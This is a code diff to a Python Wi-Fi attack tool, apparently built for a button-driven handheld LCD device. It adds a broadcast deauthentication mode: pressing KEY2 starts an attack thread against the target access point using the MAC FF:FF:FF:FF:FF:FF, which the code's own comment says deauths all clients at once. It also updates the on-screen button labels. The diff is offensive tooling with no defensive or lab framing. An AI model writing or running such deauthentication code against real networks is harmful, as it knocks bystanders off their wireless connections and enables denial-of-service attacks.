@@ -554,7 +554,7 @@ def _draw_frame(lcd, font):
     if cur_phase == "ap_select":
         d.text((2, 117), "OK:Sel K1:Scan K3:Quit", font=font, fill="#888")
     elif cur_phase == "client_select":
-        d.text((2, 117), "OK:Deauth K1:Scan K3:Q", font=font, fill="#888")
+        d.text((2, 117), "OK:One K2:All K3:Q", font=font, fill="#888")
     elif cur_phase == "done":
         d.text((2, 117), "K2:Export K1:Scan K3:Q", font=font, fill="#888")
     else:
@@ -638,6 +638,7 @@ def main():
                 time.sleep(0.3)
 
             elif btn == "OK" and phase == "client_select":
+                target_client = None
                 with lock:
                     if 0 <= selected_idx < len(client_list):
                         target_client = dict(client_list[selected_idx])
@@ -647,6 +648,17 @@ def main():
                         target=_attack_thread,
                         args=(mon_iface, _target_ap["bssid"],
                               target_client["mac"], _target_ap["channel"]),
+                        daemon=True).start()
+                time.sleep(0.3)
+
+            elif btn == "KEY2" and phase == "client_select":
+                # Broadcast deauth -- deauth ALL clients at once
+                if _target_ap:
+                    phase = "attacking"
+                    threading.Thread(
+                        target=_attack_thread,
+                        args=(mon_iface, _target_ap["bssid"],
+                              "FF:FF:FF:FF:FF:FF", _target_ap["channel"]),
                         daemon=True).start()
                 time.sleep(0.3)
 
